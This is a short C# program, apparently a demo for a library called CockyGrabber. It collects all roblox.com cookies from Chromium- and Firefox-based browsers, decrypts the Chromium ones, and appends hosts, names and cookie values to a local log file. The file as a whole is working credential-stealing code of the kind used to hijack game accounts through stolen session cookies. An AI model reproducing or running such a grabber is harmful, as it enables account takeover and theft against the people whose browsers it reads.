using CockyGrabber;
using CockyGrabber.Grabbers;
using System;
using System.IO;
using System.Text;

namespace CockyGrabberTest
{
    // This Program grabs all Roblox cookies that could be found and saves them in a log file
    class Program
    {
        private const string LogFilePath = "LOG FILE PATH HERE.txt";

        static void Main(string[] args)
        {
            UniversalGrabber g = new UniversalGrabber(); // Create Grabber

            StringBuilder cookies = new StringBuilder();
            cookies.AppendLine();
            cookies.AppendLine("==========================================================================================");
            cookies.AppendLine($"NEW LOG STARTED AT {DateTimeOffset.Now}:");
            cookies.AppendLine();

            // Grab logins and store the URLs, usernames and passwords in 'logins':
            foreach (Blink.Cookie c in g.GetAllBlinkCookiesBy(Blink.Cookie.Header.host_key, ".roblox.com"))
            {
                cookies.AppendLine($"Host: {c.HostKey} | Name: {c.Name} | Value: {c.DecryptedValue}");
            }
            foreach (Gecko.Cookie c in g.GetAllGeckoCookiesBy(Gecko.Cookie.Header.host, ".roblox.com"))
            {
                cookies.AppendLine($"Host: {c.Host} | Name: {c.Name} | Value: {c.Value}");
            }

            File.AppendAllText(LogFilePath, cookies.ToString()); // Append the grabbed logins to the log file
        }
    }
}